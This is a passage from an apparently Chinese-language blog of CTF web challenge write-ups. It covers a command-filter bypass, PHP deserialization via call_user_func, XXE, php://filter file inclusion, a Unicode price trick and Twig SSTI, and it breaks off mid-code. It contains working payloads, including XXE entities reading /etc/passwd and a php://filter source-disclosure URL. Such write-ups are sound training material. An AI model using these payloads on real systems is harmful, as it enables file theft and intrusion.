<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41463193/article/details/83539168">(1æ¡æ¶ˆæ¯) ã€PHPã€‘ä¹‹4ä¸ªåæ–œæ ã€3ä¸ªåæ–œæ çš„æƒ…å†µ_Hertterçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.thinbug.com/q/28062568">ä¸ºä»€ä¹ˆ3åæ–œæ åœ¨phpä¸­ç­‰äº4åæ–œæ ï¼Ÿ - Thinbug</a></p>
<p>é¢˜ç›®é‡Œçš„æ­£åˆ™å…¶å®æœ‰äº›é—®é¢˜ï¼Œæ‰€ä»¥è™½ç„¶å­˜åœ¨äº†å››ä¸ªåæ–œæ ä½†æ˜¯ä¾æ—§æ²¡æœ‰è¿‡æ»¤æ‰åæ–œæ </p>
<p>è´´ä¸ªå¤§ä½¬çš„æ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/076c5b422c96">ä»ä¸€é“CTFçš„éé¢„æœŸè§£çœ‹PHPåæ–œæ åŒ¹é…é—®é¢˜ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>å¯ä»¥å…ˆç”¨diræŸ¥çœ‹ç›®å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811185153589.png" alt="image-20210811185153589"></p>
<p>ca\t%20/flagæ¥ç»•è¿‡ç¬¬ä¸€ä¸ªif</p>
<p>ç”¨\çš„åŸå› æ˜¯å› ä¸ºåœ¨linuxä¸‹è¡Œå°¾è¾“\å¯ä»¥æ¢è¡Œå¹¶ä¸”ç»§ç»­è¾“å…¥å‘½ä»¤</p>
<p>è¿™é‡Œæ­£åˆ™åŒ¹é…æ¼äº†uniqå’Œsortï¼Œç”¨è¿™ä¿©ä¹Ÿèƒ½æ‹¿åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190241730.png" alt="image-20210811190241730"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190251827.png" alt="image-20210811190251827"></p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>å…ˆæŠ“åŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225117333.png" alt="image-20210811225117333"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªpostçš„å‚æ•°</p>
<p>ç„¶åæ ¹æ®æŠ¥é”™çš„ä¿¡æ¯</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225205171.png" alt="image-20210811225205171"></p>
<p>è¿™é‡Œç”¨äº†call_user_funcå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯funcæ˜¯å‡½æ•°åï¼Œpæ˜¯å‚æ•°</p>
<p>ç”¨systemè¯•æ—¶å‘ç°è¢«è¿‡æ»¤äº†ï¼Œå‘ç°file_get_contentså‡½æ•°å¯ä»¥ç”¨</p>
<p>file_get_contentsæ‹¿æºç </p>
<pre><code>&lt;?php
$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
function gettime($func, $p) &#123;
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == &quot;string&quot;) &#123;
        return $result;
    &#125; else &#123;return &quot;&quot;;&#125;
&#125;
class Test &#123;
    var $p = &quot;Y-m-d h:i:s a&quot;;
    var $func = &quot;date&quot;;
    function __destruct() &#123;
        if ($this-&gt;func != &quot;&quot;) &#123;
            echo gettime($this-&gt;func, $this-&gt;p);
        &#125;
    &#125;
&#125;
$func = $_REQUEST[&quot;func&quot;];
$p = $_REQUEST[&quot;p&quot;];

if ($func != null) &#123;
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) &#123;
        echo gettime($func, $p);
    &#125;else &#123;
        die(&quot;Hacker...&quot;);
    &#125;
&#125;
?&gt;
</code></pre>
<p>ç”±äºè¿™ä¸ªè¿‡æ»¤ä¸å­˜åœ¨ä¸testä¸­ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>åˆ©ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾æ–‡ä»¶åä¸­æœ‰flagçš„æ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p>
<p>æœ€åç”¨file_get_contentsæ¥æŸ¥çœ‹æ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224611612.png" alt="image-20210811224611612"></p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>çœ‹åˆ°è¿™é¢˜ç›®ç¬¬ä¸€çœ¼å°±æ„Ÿè§‰æ˜¯xxeæ¼æ´ï¼Œæ­£å¥½è¶è¿™ä¸ªæœºä¼šæŠŠxmlå­¦ä¸€ä¸‹</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52907838/article/details/118030007">NCTF2019]Fake XML cookbook_sgnbi~çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<blockquote>
<p>- XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</p>
<p>- HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</p>
</blockquote>
<p>åŸºæœ¬è¯­æ³•ï¼š</p>
<blockquote>
<p>- æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</p>
<p>- XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p>
<p>- XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</p>
<p>- XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</p>
<p>- XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚</p>
</blockquote>
<p>- å®ä½“å¼•ç”¨ï¼Œå¦‚æœä½ æŠŠå­—ç¬¦ &quot;&lt;&quot; æ”¾åœ¨ XMLå…ƒç´ ä¸­ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè§£æå™¨ä¼šæŠŠå®ƒå½“ä½œæ–°å…ƒç´ çš„å¼€å§‹ã€‚è¿™æ ·ä¼šäº§ç”ŸXMLé”™è¯¯ï¼š</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812002508519.png" alt="image-20210812002508519"></p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--æ ¹å…ƒç´ --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„ç»“æŸ--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„ç»“æŸ--></span></code></pre>

<p><strong>DTD</strong></p>
<p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;
&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;&#x2F;to&gt;
&lt;from&gt;@re&lt;&#x2F;from&gt;
&lt;head&gt;v3ry&lt;&#x2F;head&gt;
&lt;body&gt;g00d!&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;</code></pre>

<p>å½“ä½¿ç”¨å¤–éƒ¨DTDæ—¶ï¼Œé€šè¿‡å¦‚ä¸‹è¯­æ³•å¼•å…¥ã€‚</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"filename"</span><span class="token punctuation">></span></span></code></pre>

<p>å¤–éƒ¨DTDå®ä¾‹</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"test.dtd"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Y0u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>@re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>v3ry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>g00d!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre>

<p>test.dtdï¼š</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span></code></pre>

<p>PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚</p>
<p><strong>å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç </strong></p>
<pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;Â©right;&lt;&#x2F;test&gt;</code></pre>

<p><strong>å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç </strong></p>
<pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;Â©right;&lt;&#x2F;author&gt;</code></pre>

<p><strong>XXEæ¼æ´ç®€ä»‹</strong></p>
<p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ã€‚<br>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004625128.png" alt="image-20210812004625128"></p>
<p>é€šè¿‡å„ç§åè®®å¯ä»¥å®ç°xxeæ³¨å…¥ï¼Œä¾‹å¦‚åˆ©ç”¨file://æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p>
<p>è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;=2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´ã€‚<br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>å¯ä»¥è¯»å–XML</p>
<p>ç®€å•çš„payload</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;xml&gt;
&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;
&lt;&#x2F;xml&gt;


&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>

<p><strong>é¢˜è§£ï¼š</strong></p>
<p>æŠ“åŒ…ï¼Œèƒ½çœ‹å‡ºæ˜¯ç”¨xmlè¿›è¡Œä¼ è¾“æ•°æ®</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812003649956.png" alt="image-20210812003649956"></p>
<p>ç›´æ¥ä¸Špayload</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004223242.png" alt="image-20210812004223242"></p>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>çœ‹è¿™ä¸ªurlï¼Œè¯•è¯•ä¼ªåè®®è¯»å–</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163436662.png" alt="image-20210812163436662"></p>
<p>å¤šäº†ä¸ªphp</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163515084.png" alt="image-20210812163515084"></p>
<p>æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªæ¥è¯»æºç ?category=php://filter/read=convert.base64-encode/resource=index</p>
<p>base64è§£ç åçš„é‡ç‚¹</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
$file &#x3D; $_GET[&#39;category&#39;];

if(isset($file))
&#123;
	if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;
		include ($file . &#39;.php&#39;);
	&#125;
	else&#123;
		echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
	&#125;
&#125;
?&gt;</code></pre>

<p>å­˜åœ¨flag.phpé¡µé¢ï¼Œä¹‹åå°±æ˜¯æƒ³åŠæ³•æŠŠä»–è¯»å‡ºæ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163740442.png" alt="image-20210812163740442"></p>
<p>æ¥ä¸‹æ¥æœ‰ä¸€ä¸ª</p>
<p>phpä¼ªåè®®åµŒå¥—çš„çŸ¥è¯†ç‚¹</p>
<p>PHPä¼ªåè®®å¯ä»¥å°†æŸä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹åŒ…å«åœ¨php://filter/convert.base64-encode/resource=flagä¸­ã€‚æ¯”å¦‚ï¼šphp://filter/convert.base64-encode/<strong>index</strong>/resource=flag</p>
<p>è¿™æ ·å°±èƒ½ç»•è¿‡ifçš„åˆ¤æ–­ï¼Œè¯»å–flagæ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812164621882.png" alt="image-20210812164621882"></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165152600.png" alt="image-20210812165152600"></p>
<p>è¾“å…¥idå’Œä»·æ ¼ï¼Œåº”è¯¥æ˜¯è´­ä¹°ç‹¬è§’å…½ï¼Œè€Œä¸”priceåªå…è®¸è¾“å…¥ä¸€ä½æ•°ï¼Œå‰ä¸‰ä¸ªä¹°çš„æ—¶å€™éƒ½æ˜¾ç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165251531.png" alt="image-20210812165251531"></p>
<p>ä½†æ˜¯å› ä¸ºpriceçš„è¾“å…¥é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘çŒœè¿™é‡Œåº”è¯¥æ˜¯è¦æƒ³åŠæ³•è´­ä¹°ç¬¬å››ä¸ªç‹¬è§’å…½</p>
<p>è¿™é‡Œè¦åˆ©ç”¨Unicodeçš„ç¼–ç ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå¤§äº1337çš„å­—ç¬¦</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p>
<p>æ¯”å¦‚è¿™ä¸ª</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165952292.png" alt="image-20210812165952292"></p>
<p>æˆåŠŸæ‹¿åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170021095.png" alt="image-20210812170021095"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170027487.png" alt="image-20210812170027487"></p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220813990.png" alt="image-20210812220813990"></p>
<p>çœ‹ä¸€çœ¼hint</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220919778.png" alt="image-20210812220919778"></p>
<p>flagé¡µé¢çš„ç™»å½•æ¡†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221024199.png" alt="image-20210812221024199"></p>
<p>è¿™é‡Œå­˜åœ¨sstiæ³¨å…¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220731194.png" alt="image-20210812220731194"></p>
<p>å¯ä»¥è¯•å‡ºæ¥æ˜¯twigæ¨¡æ¿ï¼Œæ ¹æ®æç¤ºæ³¨å…¥ç‚¹åº”è¯¥åœ¨cookieé‡Œï¼ŒæŠ“åŒ…</p>
<p>é€šè¿‡ä¿®æ”¹userå†…å®¹å®ç°æ³¨å…¥</p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´ | K0rz3n&#39;s Blog</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p>
<p>sstiè¿˜æ˜¯ä¸å¤ªæ‡‚ï¼Œæ¯•ç«Ÿæˆ‘pythonè¿˜æ˜¯æ²¡å­¦ä¼šï¼Œé‡åˆ°sstiçš„é¢˜æˆ‘åªèƒ½ç›´æ¥æ‰¾payloadï¼Œå…ˆæ”¾åœ¨è¿™ï¼Œç­‰åˆ·å®Œbuuç¬¬äºŒé¡µé¢˜ç›®ä¹‹åå†å›å¤´çœ‹ä¸€é</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>é¢˜ç›®æºç </p>
<pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python

# #encoding&#x3D;utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding(&#39;latin1&#39;)

app &#x3D; Flask(__name__)

secert_key &#x3D; os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action &#x3D; action
        self.param &#x3D; param
        self.sign &#x3D; sign
        self.sandbox &#x3D; md5(ip)
        if(not os.path.exists(self.sandbox)):
            os.mkdir(self.sandbox)

    def Exec(self):
        result &#x3D; &#123;&#125;
        result[&#39;code&#39;] &#x3D; 500
        if (self.checkSign()):
            if &quot;scan&quot; in self.action:
